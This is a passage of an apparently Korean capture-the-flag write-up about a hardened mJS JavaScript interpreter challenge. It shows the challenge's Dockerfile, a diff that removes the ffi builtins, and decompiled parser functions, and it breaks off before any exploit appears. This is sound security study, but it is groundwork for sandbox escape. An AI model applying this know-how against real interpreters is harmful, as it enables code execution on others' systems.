FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install -y xinetd python3 xxd COPY mjs / COPY ynetd / COPY remote.py / RUN echo \u0026#34;kalmar{redacted}\u0026#34; \u0026gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt USER 1000:1000 EXPOSE 10002 CMD ./ynetd -p 10002 \u0026#34;timeout 60 ./remote.py\u0026#34; 22.04이다.\ndiff --git a/Makefile b/Makefile index d265d7e..d495e84 100644 --- a/Makefile +++ b/Makefile @@ -5,6 +5,7 @@ BUILD_DIR = build RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR) DOCKER_GCC ?= $(RD) mgos/gcc DOCKER_CLANG ?= $(RD) mgos/clang +CC = clang include $(SRCPATH)/mjs_sources.mk @@ -81,7 +82,7 @@ CFLAGS += $(COMMON_CFLAGS) # NOTE: we compile straight from sources, not from the single amalgamated file, # in order to make sure that all sources include the right headers $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR) -\t$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG) +\t$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG) $(BUILD_DIR): mkdir -p $@ diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c index 6f51e08..36c2b43 100644 --- a/src/mjs_builtin.c +++ b/src/mjs_builtin.c @@ -137,12 +137,12 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) { mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load)); mjs_set(mjs, obj, \u0026#34;print\u0026#34;, ~0, mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print)); - mjs_set(mjs, obj, \u0026#34;ffi\u0026#34;, ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); - mjs_set(mjs, obj, \u0026#34;ffi_cb_free\u0026#34;, ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); - mjs_set(mjs, obj, \u0026#34;mkstr\u0026#34;, ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); + /* mjs_set(mjs, obj, \u0026#34;ffi\u0026#34;, ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */ + /* mjs_set(mjs, obj, \u0026#34;ffi_cb_free\u0026#34;, ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */ + /* mjs_set(mjs, obj, \u0026#34;mkstr\u0026#34;, ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */ mjs_set(mjs, obj, \u0026#34;getMJS\u0026#34;, ~0, mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs)); mjs_set(mjs, obj, \u0026#34;die\u0026#34;, ~0, @@ -151,8 +151,8 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) { mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc)); mjs_set(mjs, obj, \u0026#34;chr\u0026#34;, ~0, mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr)); - mjs_set(mjs, obj, \u0026#34;s2o\u0026#34;, ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); + /* mjs_set(mjs, obj, \u0026#34;s2o\u0026#34;, ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */ /* * Populate JSON.parse() and JSON.stringify() diff --git a/src/mjs_exec.c b/src/mjs_exec.c index bd48fea..24c2c7c 100644 --- a/src/mjs_exec.c +++ b/src/mjs_exec.c @@ -835,7 +835,7 @@ MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) { *func = MJS_UNDEFINED; // Return value // LOG(LL_VERBOSE_DEBUG, (\u0026#34;CALLING %d\u0026#34;, i + 1)); - } else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) { + } else if (mjs_is_ffi_sig(*func)) { /* Call ffi-ed function */ call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx); patch.diff가 주어진다.\nhttps://github.com/cesanta/mjs diff.patch is just hardening :) README.txt가 주어졌다. diff.patch는 그냥 hardening 이라고 한다.\nhttps://github.com/cesanta/mjs 깃허브에 들어가보면 diff에서 ffi를 왜 없애는지 알 수 있다.\n$ ./build/mjs -e \u0026#39;ffi(\u0026#34;double sin(double)\u0026#34;)(1.23)\u0026#39; 0.942489 다음과 같이 쓸 수 있어서, system으로 바로 따는걸 막기 위해서 일부러 없애놓은 것 같다.\nmjs_err_t __cdecl mjs_exec_internal(mjs *mjs, const char *path, const char *code, int generate_jsc, mjs_val_t *res) { size_t v5; // rax int v6; // eax char *v7; // rax _QWORD v9[2]; // [rsp+0h] [rbp-B0h] BYREF mjs *v10; // [rsp+10h] [rbp-A0h] char *filename; // [rsp+18h] [rbp-98h] __int64 v12; // [rsp+20h] [rbp-90h] FILE *fp; // [rsp+28h] [rbp-88h] char *data; // [rsp+30h] [rbp-80h] size_t size; // [rsp+38h] [rbp-78h] BYREF mjs_bcode_part *bp_0; // [rsp+40h] [rbp-70h] unsigned __int64 __vla_expr0; // [rsp+48h] [rbp-68h] _QWORD *v18; // [rsp+50h] [rbp-60h] const char *jscext; // [rsp+58h] [rbp-58h] int read_mmapped; // [rsp+64h] [rbp-4Ch] int rewrite; // [rsp+68h] [rbp-48h] int basename_len; // [rsp+6Ch] [rbp-44h] const char *jsext; // [rsp+70h] [rbp-40h] mjs_val_t r; // [rsp+78h] [rbp-38h] BYREF size_t off; // [rsp+80h] [rbp-30h] mjs_val_t *resa; // [rsp+88h] [rbp-28h] int generate_jsca; // [rsp+94h] [rbp-1Ch] const char *JS_CODE; // [rsp+98h] [rbp-18h] const char *patha; // [rsp+A0h] [rbp-10h] mjs *mjsa; // [rsp+A8h] [rbp-8h] mjsa = mjs; patha = path; // \u0026lt;stdin\u0026gt; JS_CODE = code; generate_jsca = generate_jsc; resa = res; off = mjs-\u0026gt;bcode_len; r = 0xFFF3000000000000LL; mjs-\u0026gt;error = mjs_parse(path, code, mjs); if ( cs_log_level_0 \u0026gt;= 4 ) mjs_dump(mjsa, 1); if ( generate_jsca == -1 ) generate_jsca = (*((_BYTE *)mjsa + 464) \u0026amp; 4) != 0; if ( mjsa-\u0026gt;error == MJS_OK ) { if ( generate_jsca ) { if ( patha ) { jsext = \u0026#34;.js\u0026#34;; v12 = (int)strlen(patha); basename_len = v12 - strlen(\u0026#34;.js\u0026#34;); if ( basename_len \u0026gt; 0 \u0026amp;\u0026amp; !strcmp(\u0026amp;patha[basename_len], jsext) ) { rewrite = 1; read_mmapped = 1; jscext = \u0026#34;.jsc\u0026#34;; v9[1] = basename_len; v5 = strlen(\u0026#34;.jsc\u0026#34;); v18 = v9; filename = (char *)v9 - ((basename_len + v5 + 16) \u0026amp; 0xFFFFFFFFFFFFFFF0LL); __vla_expr0 = basename_len + v5 + 1; memcpy(filename, patha, basename_len); strcpy(\u0026amp;filename[basename_len], jscext); v10 = mjsa; v6 = mjs_bcode_parts_cnt(mjsa); bp_0 = mjs_bcode_part_get(v10, v6 - 1); data = cs_mmap_file(filename, \u0026amp;size); if ( data ) { if ( size == bp_0-\u0026gt;data.len \u0026amp;\u0026amp; !memcmp(data, bp_0-\u0026gt;data.p, size) ) rewrite = 0; munmap(data, size); } if ( rewrite ) { fp = fopen64(filename, \u0026#34;wb\u0026#34;); if ( fp ) { fwrite(bp_0-\u0026gt;data.p, bp_0-\u0026gt;data.len, 1uLL, fp); fclose(fp); } else { if ( cs_log_print_prefix(LL_WARN, \u0026#34;src/mjs_exec.c\u0026#34;, 1054) ) cs_log_printf(\u0026#34;Failed to open %s for writing\u0026#34;, filename); read_mmapped = 0; } } if ( read_mmapped ) { free((void *)bp_0-\u0026gt;data.p); v7 = cs_mmap_file(filename, \u0026amp;bp_0-\u0026gt;data.len); bp_0-\u0026gt;data.p = v7; *((_BYTE *)bp_0 + 24) = *((_BYTE *)bp_0 + 24) \u0026amp; 0xEF | 0x10; } } } } mjs_execute(mjsa, off, \u0026amp;r); mjs_exec_internal 함수의 인자로 path가 주어지는데, 이건 -e 옵션으로 직접 js 코드를 주면, \u0026lt;stdin\u0026gt; 문자열의 주소가 된다. code는 말 그대로 js code의 포인터이다. mjs는 그냥 mjs 객체이다.\nmjs_parse와 mjs_execute가 분석해야할 주요 함수이다. 간단하게 기능을 알아보자면, mjs_parse는 문법을 분석해서 바이트 코드를 점화해서 mjs 객체에 추가해놓는다. 그리고 mjs_execute는 점화된 바이트 코드를 실행한다.\nmjs_parse mjs_err_t __cdecl mjs_parse(const char *path, const char *CODE_, mjs *mjs) { size_t v3; // rax mjs *a; // [rsp+8h] [rbp-B8h] const char *v6; // [rsp+10h] [rbp-B0h] int map_len; // [rsp+24h] [rbp-9Ch] size_t llen; // [rsp+28h] [rbp-98h] size_t start_idx; // [rsp+30h] [rbp-90h] pstate p; // [rsp+38h] [rbp-88h] BYREF mjs_err_t res; // [rsp+A4h] [rbp-1Ch] mjs *mjsa; // [rsp+A8h] [rbp-18h] const char *CODE; // [rsp+B0h] [rbp-10h] const char *patha; // [rsp+B8h] [rbp-8h] patha = path; CODE = CODE_; mjsa = mjs; res = MJS_OK; pinit(path, CODE_, \u0026amp;p); p.mjs = mjsa; p.cur_idx = mjsa-\u0026gt;bcode_gen.len; emit_byte(\u0026amp;p, 0x24u); // OP_BCODE_HEADER = 0x24 start off start_idx = p.mjs-\u0026gt;bcode_gen.len; mbuf_append(\u0026amp;p.mjs-\u0026gt;bcode_gen, 0LL, 0xCuLL); a = p.mjs; v6 = patha; v3 = strlen(patha); mbuf_append(\u0026amp;a-\u0026gt;bcode_gen, v6, v3 + 1); *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx + 4] = p.mjs-\u0026gt;bcode_gen.len - start_idx; p.start_bcode_idx = p.mjs-\u0026gt;bcode_gen.len; p.cur_idx = p.mjs-\u0026gt;bcode_gen.len; res = parse_statement_list(\u0026amp;p, 0); emit_byte(\u0026amp;p, 0x23u); // OP_EXIT *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx + 8] = p.mjs-\u0026gt;bcode_gen.len - start_idx; map_len = p.offset_lineno_map.len; llen = cs_varint_llen(SLODWORD(p.offset_lineno_map.len)); mbuf_resize(\u0026amp;p.mjs-\u0026gt;bcode_gen, llen + p.mjs-\u0026gt;bcode_gen.size); cs_varint_encode(map_len, (uint8_t *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[p.mjs-\u0026gt;bcode_gen.len], llen); p.mjs-\u0026gt;bcode_gen.len += llen; mbuf_append(\u0026amp;p.mjs-\u0026gt;bcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len); *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx] = p.mjs-\u0026gt;bcode_gen.len - start_idx; mbuf_free(\u0026amp;p.offset_lineno_map); if ( res ) mbuf_free(\u0026amp;mjsa-\u0026gt;bcode_gen); else mjs_bcode_commit(mjsa); return res; } mjs_parse 함수의 모습이다. pinit은 pstate를 초기화해주는 함수이다.\n00000000 pstate struc ; (sizeof=0x68, align=0x8, copyof_117) 00000000 ; XREF: mjs_parse/r 00000000 ; parse_return/r ... 00000000 file_name dq ? ; offset 00000008 buf dq ? ; offset 00000010 pos dq ? ; offset 00000018 line_no dd ? 0000001C last_emitted_line_no dd ? 00000020 offset_lineno_map mbuf ? ; XREF: mjs_parse+142/r 00000020 ; mjs_parse+1B0/r ... 00000038 prev_tok dd ? 0000003C db ? ; undefined 0000003D db ? ; undefined 0000003E db ? ; undefined 0000003F db ? ; undefined 00000040 tok tok ? 00000050 mjs dq ? ; XREF: mjs_parse+36/w 00000050 ; mjs_parse+3A/r ... ; offset 00000058 start_bcode_idx dd ? ; XREF: mjs_parse+E5/w 0000005C cur_idx dd ? ; XREF: mjs_parse+42/w 0000005C ; mjs_parse+F0/w 00000060 depth dd ? 00000064 db ? ; undefined 00000065 db ? ; undefined 00000066 db ? ; undefined 00000067 db ? ; undefined 00000068 pstate ends 00000068 pstate 구조체는 위와 같다.\n초기화가 잘 된다음에, parse_statement_list 함수로 들어간다. 이 함수가 제일 중요한 함수다.\nmjs_err_t __cdecl parse_statement_list(pstate *p, int et) { bool v3; // [rsp+Bh] [rbp-15h] int drop; // [rsp+Ch] [rbp-14h] mjs_err_t res; // [rsp+10h] [rbp-10h] res = MJS_OK; drop = 0; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 147) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 147LL); pnext(p); // cur_tok = 0xCA -\u0026gt; STR while ( 1 ) // 8,9 () { v3 = 0; if ( res == MJS_OK ) { v3 = 0; if ( p-\u0026gt;tok.tok ) v3 = p-\u0026gt;tok.tok != et; } if ( !v3 ) break; if ( drop ) emit_byte(p, 1u); res = parse_statement(p); drop = 1; while ( p-\u0026gt;tok.tok == 3 ) { if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 152) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 152LL); pnext(p); } } if ( !drop ) emit_byte(p, 0x11u); return res; } pnext 함수는 다음 코드의 부분까지 파싱하는 함수다.\nint __cdecl pnext(pstate *p) { unsigned int tok; // [rsp+0h] [rbp-10h] int toka; // [rsp+0h] [rbp-10h] int tmp; // [rsp+4h] [rbp-Ch] int tmpa; // [rsp+4h] [rbp-Ch] tok = 1; skip_spaces_and_comments(p); p-\u0026gt;tok.ptr = p-\u0026gt;pos; p-\u0026gt;tok.len = 1; if ( *p-\u0026gt;pos ) { if ( mjs_is_digit(*p-\u0026gt;pos) ) { tok = getnum(p); } else if ( *p-\u0026gt;pos == \u0026#39;\\\u0026#39;\u0026#39; || *p-\u0026gt;pos == \u0026#39;\u0026#34;\u0026#39; ) { tok = getstr(p); } else if ( mjs_is_ident(*p-\u0026gt;pos) ) { toka = getident(p); // GET ALPHABET KEYWORLD ex) let a tok = toka + is_reserved_word_token(p-\u0026gt;tok.ptr, p-\u0026gt;tok.len);// 32 reserved WORDS } else if ( strchr(\u0026#34;,.:;{}[]()?\u0026#34;, *p-\u0026gt;pos) ) { tok = *p-\u0026gt;pos; } else { tmp = longtok3(p, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;=\u0026#39;); if ( tmp ) goto LABEL_24; tmp = longtok3(p, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;=\u0026#39;); if ( tmp ) goto LABEL_24; tmp = longtok4(p, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;=\u0026#39;); if ( tmp ) goto LABEL_24; tmp = longtok3(p, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;); if ( tmp ) goto LABEL_24; tmp = longtok3(p, \u0026#39;=\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;=\u0026#39;); if ( tmp || (tmp = longtok3(p, 33, 61, 61)) != 0 || (tmp = longtok(p, \u0026#34;\u0026amp;\u0026#34;, \u0026#34;\u0026amp;=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;|\u0026#34;, \u0026#34;|=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026lt;=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;\u0026gt;=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;-\u0026#34;, \u0026#34;-=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;+\u0026#34;, \u0026#34;+=\u0026#34;)) != 0 ) { LABEL_24: tok = tmp; } else { tmpa = longtok(p, \u0026#34;^~+-%/*\u0026lt;\u0026gt;=!|\u0026amp;\u0026#34;, \u0026#34;=\u0026#34;); if ( tmpa ) tok = tmpa; } } } else { tok = 0; } if ( *p-\u0026gt;pos ) ++p-\u0026gt;pos; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_tok.c\u0026#34;, 250) ) cs_log_printf(\u0026#34; --\u0026gt; %d [%.*s]\u0026#34;, tok, p-\u0026gt;tok.len, p-\u0026gt;tok.ptr); p-\u0026gt;prev_tok = p-\u0026gt;tok.tok; p-\u0026gt;tok.tok = ptranslate(tok); // 8,9 -\u0026gt; () return p-\u0026gt;tok.tok; } 이런식으로 세미콜론을 기준으로 자르거나 하면서 파싱을 해준다.\nint __cdecl ptranslate(enum mjs_TOK tok) { switch ( tok ) { case 0x21: return 22; case 0x25: return 16; case 0x26: return 17; case 0x28: return 8; case 0x29: return 9; case 0x2A: return 12; case 0x2B: return 13; case 0x2C: return 4; case 0x2D: return 14; case 0x2E: return 20; case 0x2F: return 15; case 0x3A: return 2; case 0x3B: return 3; case 0x3C: return 24; case 0x3D: return 5; case 0x3E: return 25; case 0x3F: return 21; case 0x5B: return 10; case 0x5D: return 11; case 0x5E: return 19; case 0x7B: return 6; case 0x7C: return 18; case 0x7D: return 7; case 0x7E: return 23; case 0x213D: return 39; case 0x253D: return 36; case 0x2626: return 42; case 0x263D: return 34; case 0x2A3D: return 32; case 0x2B2B: return 29; case 0x2B3D: return 30; case 0x2D2D: return 28; case 0x2D3D: return 31; case 0x2F3D: return 33; case 0x3C3C: return 26; case 0x3C3D: return 40; case 0x3D3D: return 38; case 0x3E3D: return 41; case 0x3E3E: return 27; case 0x5E3D: return 37; case 0x7C3D: return 35; case 0x7C7C: return 43; case 0x213D3D: return 45; case 0x3C3C3D: return 46; case 0x3D3D3D: return 44; case 0x3E3E3D: return 47; case 0x3E3E3E: return 48; case 0x3E3E3E3D: return 49; } return tok; } 이건 그냥 tok에 맞는게 있으면, 그걸 리턴해준다. 이부분은 소스코드를 보는게 더 이해가 잘된다.\nstatic int ptranslate(int tok) { #define DT(a, b) ((a) \u0026lt;\u0026lt; 8 | (b)) #define TT(a, b, c) ((a) \u0026lt;\u0026lt; 16 | (b) \u0026lt;\u0026lt; 8 | (c)) #define QT(a, b, c, d) ((a) \u0026lt;\u0026lt; 24 | (b) \u0026lt;\u0026lt; 16 | (c) \u0026lt;\u0026lt; 8 | (d)) /* Map token ID produced by mjs_tok.c to token ID produced by lemon */ /* clang-format off */ switch (tok) { case \u0026#39;:\u0026#39;: return TOK_COLON; case \u0026#39;;\u0026#39;: return TOK_SEMICOLON; case \u0026#39;,\u0026#39;: return TOK_COMMA; case \u0026#39;=\u0026#39;: return TOK_ASSIGN; case \u0026#39;{\u0026#39;: return TOK_OPEN_CURLY; case \u0026#39;}\u0026#39;: return TOK_CLOSE_CURLY; case \u0026#39;(\u0026#39;: return TOK_OPEN_PAREN; case \u0026#39;)\u0026#39;: return TOK_CLOSE_PAREN; case \u0026#39;[\u0026#39;: return TOK_OPEN_BRACKET; case \u0026#39;]\u0026#39;: return TOK_CLOSE_BRACKET; case \u0026#39;*\u0026#39;: return TOK_MUL; case \u0026#39;+\u0026#39;: return TOK_PLUS; case \u0026#39;-\u0026#39;: return TOK_MINUS; case \u0026#39;/\u0026#39;: return TOK_DIV; case \u0026#39;%\u0026#39;: return TOK_REM; case \u0026#39;\u0026amp;\u0026#39;: return TOK_AND; case \u0026#39;|\u0026#39;: return TOK_OR; case \u0026#39;^\u0026#39;: return TOK_XOR; case \u0026#39;.\u0026#39;: return TOK_DOT; case \u0026#39;?\u0026#39;: return TOK_QUESTION; case \u0026#39;!\u0026#39;: return TOK_NOT; case \u0026#39;~\u0026#39;: return TOK_TILDA; case \u0026#39;\u0026lt;\u0026#39;: return TOK_LT; case \u0026#39;\u0026gt;\u0026#39;: return TOK_GT; case DT(\u0026#39;\u0026lt;\u0026#39;,\u0026#39;\u0026lt;\u0026#39;): return TOK_LSHIFT; case DT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;): return TOK_RSHIFT; case DT(\u0026#39;-\u0026#39;,\u0026#39;-\u0026#39;): return TOK_MINUS_MINUS; case DT(\u0026#39;+\u0026#39;,\u0026#39;+\u0026#39;): return TOK_PLUS_PLUS; case DT(\u0026#39;+\u0026#39;,\u0026#39;=\u0026#39;): return TOK_PLUS_ASSIGN; case DT(\u0026#39;-\u0026#39;,\u0026#39;=\u0026#39;): return TOK_MINUS_ASSIGN; case DT(\u0026#39;*\u0026#39;,\u0026#39;=\u0026#39;): return TOK_MUL_ASSIGN; case DT(\u0026#39;/\u0026#39;,\u0026#39;=\u0026#39;): return TOK_DIV_ASSIGN; case DT(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_AND_ASSIGN; case DT(\u0026#39;|\u0026#39;,\u0026#39;=\u0026#39;): return TOK_OR_ASSIGN; case DT(\u0026#39;%\u0026#39;,\u0026#39;=\u0026#39;): return TOK_REM_ASSIGN; case DT(\u0026#39;^\u0026#39;,\u0026#39;=\u0026#39;): return TOK_XOR_ASSIGN; case DT(\u0026#39;=\u0026#39;,\u0026#39;=\u0026#39;): return TOK_EQ; case DT(\u0026#39;!\u0026#39;,\u0026#39;=\u0026#39;): return TOK_NE; case DT(\u0026#39;\u0026lt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_LE; case DT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_GE; case DT(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\u0026amp;\u0026#39;): return TOK_LOGICAL_AND; case DT(\u0026#39;|\u0026#39;,\u0026#39;|\u0026#39;): return TOK_LOGICAL_OR; case TT(\u0026#39;=\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;=\u0026#39;): return TOK_EQ_EQ; case TT(\u0026#39;!\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;=\u0026#39;): return TOK_NE_NE; case TT(\u0026#39;\u0026lt;\u0026#39;,\u0026#39;\u0026lt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_LSHIFT_ASSIGN; case TT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_RSHIFT_ASSIGN; case TT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;): return TOK_URSHIFT; case QT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_URSHIFT_ASSIGN; } /* clang-format on */ return tok; } mjs_err_t __cdecl parse_statement(pstate *p) { int tok; // [rsp+8h] [rbp-18h] mjs_err_t res; // [rsp+Ch] [rbp-14h] if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 900) ) cs_log_printf(\u0026#34;[%.*s]\u0026#34;, 10, p-\u0026gt;tok.ptr); tok = p-\u0026gt;tok.tok; switch ( tok ) { case 3: emit_byte(p, 0x11u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 904) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 904LL); goto LABEL_34; case 6: return parse_block(p, 1); case 0xCB: emit_byte(p, 0x11u); emit_byte(p, 0x20u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 919) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 919LL); goto LABEL_34; } if ( (unsigned int)(tok - 0xCC) \u0026lt; 2 ) goto LABEL_36; if ( tok == 0xCE ) { emit_byte(p, 0x21u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 923) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 923LL); LABEL_34: pnext(p); return 0; } if ( (unsigned int)(tok - 0xD1) \u0026lt; 2 ) goto LABEL_36; if ( tok == 0xD6 ) return parse_for(p); if ( tok == 0xD8 ) return parse_if(p); if ( (unsigned int)(tok - 0xDA) \u0026lt; 2 ) goto LABEL_36; if ( tok == 0xDD ) return parse_return(p); if ( tok == 0xDE || tok == 0xE0 || tok == 0xE2 || (unsigned int)(tok - 0xE4) \u0026lt; 2 ) goto LABEL_36; switch ( tok ) { case 0xE6: return parse_while(p); case 0xE7: LABEL_36: mjs_set_errorf(p-\u0026gt;mjs, MJS_SYNTAX_ERROR, \u0026#34;[%.*s] is not implemented\u0026#34;, (unsigned int)p-\u0026gt;tok.len, p-\u0026gt;tok.ptr); return 1; case 0xE8: return parse_let(p); } while ( 1 ) { res = parse_expr(p); if ( res ) return res; if ( p-\u0026gt;tok.tok != 4 ) break; emit_byte(p, 1u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 948) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 948LL); pnext(p); } return 0; } parse_statement 함수는 tok에 따라 잘 파싱을 해서 바이트 코드를 점화하는 함수다. 마지막에 parse_expr 함수를 호출한다.\nparse_expr 함수는 말 그대로 expression을 파싱하는 함수다. ternary, logical_or, logical_and, bitwise_or \u0026hellip; shift, plus, minus \u0026hellip; unary 이런식으로 함수를 계속 호출한다. 즉 그냥 연산자 우선순위를 구현한거라고 보면 된다.\nmjs_err_t __cdecl parse_expr(pstate *p) { return parse_assignment(p, 0); } mjs_err_t __cdecl parse_assignment(pstate *p, int prev_op) { int op; // [rsp+4h] [rbp-1Ch] mjs_err_t res; // [rsp+8h] [rbp-18h] mjs_err_t resa; // [rsp+8h] [rbp-18h] res = parse_ternary(p, 0); if ( res == MJS_OK ) { if ( findtok(\u0026amp;s_assign_ops, p-\u0026gt;tok.tok) ) { op = p-\u0026gt;tok.tok; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 503) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 503LL); pnext(p); resa = parse_assignment(p, 0); if ( resa ) return resa; emit_op(p, op); } return 0; } return res; } 삼항 연산자를 먼저 파싱한다.\nmjs_err_t __cdecl parse_ternary(pstate *p, int prev_op) { size_t off_else; // [rsp+0h] [rbp-30h] size_t off_endif; // [rsp+8h] [rbp-28h] size_t off_endifa; // [rsp+8h] [rbp-28h] size_t off_if; // [rsp+10h] [rbp-20h] mjs_err_t res; // [rsp+18h] [rbp-18h] mjs_err_t resa; // [rsp+18h] [rbp-18h] mjs_err_t resb; // [rsp+18h] [rbp-18h] res = parse_logical_or(p, 0); if ( res == MJS_OK ) { if ( prev_op ) emit_op(p, prev_op); if ( p-\u0026gt;tok.tok == 21 ) { if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 470) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 470LL); pnext(p); emit_byte(p, 7u); off_if = p-\u0026gt;cur_idx; emit_init_offset(p); resa = parse_ternary(p, 0); if ( resa ) return resa; emit_byte(p, 4u); off_else = p-\u0026gt;cur_idx; emit_init_offset(p); off_endif = p-\u0026gt;cur_idx; emit_byte(p, 1u); if ( p-\u0026gt;tok.tok != 2 ) { mjs_set_errorf( p-\u0026gt;mjs, MJS_SYNTAX_ERROR, \u0026#34;parse error at line %d: [%.*s]\u0026#34;, (unsigned int)p-\u0026gt;line_no, 10LL, p-\u0026gt;tok.ptr, off_else); return 1; } if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 485) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 485LL); pnext(p); resb = parse_ternary(p, 0); if ( resb ) return resb; off_endifa = off_endif + mjs_bcode_insert_offset(p, p-\u0026gt;mjs, off_else, p-\u0026gt;cur_idx - off_else - 1); mjs_bcode_insert_offset(p, p-\u0026gt;mjs, off_if, off_endifa - off_if - 1); } return 0; } return res; } mjs_err_t __cdecl parse_logical_or(pstate *p, int prev_op) { uint8_t v2; // al size_t off_if; // [rsp+8h] [rbp-28h] int op; // [rsp+14h] [rbp-1Ch] mjs_err_t res; // [rsp+18h] [rbp-18h] int ops[2]; // [rsp+1Ch] [rbp-14h] BYREF int prev_opa; // [rsp+24h] [rbp-Ch] pstate *pa; // [rsp+28h] [rbp-8h] pa = p; prev_opa = prev_op; *(_QWORD *)ops = 43LL; ++p-\u0026gt;depth; if ( pa-\u0026gt;depth \u0026lt;= 512 ) { res = parse_logical_and(pa, 0); if ( res == MJS_OK ) { if ( prev_opa ) emit_op(pa, prev_opa); if ( findtok(ops, pa-\u0026gt;tok.tok) ) { op = pa-\u0026gt;tok.tok; off_if = 0LL; if ( ops[0] == 42 || ops[0] == 43 ) { v2 = 6; if ( ops[0] == 42 ) v2 = 8; emit_byte(pa, v2); off_if = pa-\u0026gt;cur_idx; emit_init_offset(pa); emit_byte(pa, 1u); op = 0; } if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 460) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 